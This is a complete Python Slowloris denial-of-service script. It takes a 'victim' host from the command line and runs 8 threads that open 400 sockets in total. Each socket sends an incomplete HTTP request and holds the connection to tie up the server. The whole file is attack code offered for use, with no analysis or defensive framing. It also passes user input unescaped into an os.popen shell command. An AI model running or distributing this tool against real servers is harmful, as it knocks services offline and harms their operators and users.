#!/usr/bin/env python3

import os
import sys
import socket
import time
import signal
import threading

MAX_THREAD  = 8
MAX_CONN    = 400
TIMEOUT_TCP = 5
TIMEOUT_REQ = 90

def slowloris():
    url = sys.argv[1]
    hostport = url.split(':')
    domain = hostport[0]
    
    ping = "host %s | awk '/has address/ { print $4 ; exit }'" % hostport[0]
    host = (os.popen(ping).read().strip() or url) if len(url.split('.')) != 4 else hostport[0]
    port = int(hostport[1]) if len(hostport) == 2 else 80
    
    print('Attacking %s at %s:%i' % (domain, host, port)) \
        if domain != host else print('Attacking %s:%i' % (host, port))
    start_attack_thread(host, port)

    try:
        interruptable_event().wait()
    except KeyboardInterrupt:
        sys.exit(0)

def start_attack_thread(host, port):
    i = 0
    while i < MAX_THREAD:
        thread = threading.Thread(target=send_payloads, args=[host, port])
        thread.daemon = True

        try:
            thread.start()
            i += 1
        except:
            pass
          
def send_payloads(host, port):
    while True:
        socks = []

        i = 0
        while i != round(MAX_CONN / MAX_THREAD):
            i += 1
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(TIMEOUT_TCP)
                socks.append(sock)
            except socket.error as msg:
                pass
        
        for sock in socks:
            send_payload(sock, host, port)
        
        time.sleep(TIMEOUT_REQ)
        disconnect_sockets(socks)

def send_payload(sock, host, port):
    random = int(time.time() * 1000000)
    method = "POST" if random % 2 == 0 else "GET"
    payload = ('%s /?%i HTTP/1.1\r\n'
        'Host: %s\r\n'
        'User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n'
        'Content-Length: 42\r\n') % (method, random, host)

    try:
        sock.connect((host, port))
        sock.sendall(payload.encode('utf-8'))
    except socket.error as msg:
        pass

def disconnect_sockets(sockets):
    for sock in sockets:
        try:
            sock.shutdown(SHUT_RDWR)
        except:
            pass
        finally:
            sock.close()
    
def interruptable_event():
    e = threading.Event()

    def patched_wait():
        while not e.is_set():
            e._wait(3)

    e._wait = e.wait
    e.wait = patched_wait
    return e

def signal_handler(signal, frame):
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 2 or not sys.argv[1]:
        print("No URL or IP of the victim given")
        print("Usage: ~$ ./slowloris.py example.com")
        sys.exit(1)

    signal.signal(signal.SIGHUP, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    slowloris()
